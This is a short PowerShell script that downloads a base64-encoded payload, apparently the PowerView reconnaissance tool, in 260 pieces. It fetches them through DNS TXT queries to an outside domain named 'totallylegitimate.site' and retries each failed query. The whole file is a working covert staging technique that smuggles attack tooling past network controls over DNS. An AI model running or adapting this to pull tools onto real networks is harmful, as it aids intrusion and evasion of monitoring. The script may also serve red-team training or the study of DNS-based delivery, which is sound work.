﻿
$b64pv = ''
:parts for ($i=1;$i -le 260;$i++) {
    while($true) {
        try {
            $response = Resolve-DnsName -Type txt powerview$i.totallylegitimate.site | select strings
            $b64pv += $response.Strings -replace '[\n,;]'
            continue parts
        }
        catch [System.ComponentModel.Win32Exception] {
            Echo "bad packet... retrying"
        }
    }
}
Echo "Done!"
Echo $b64pv
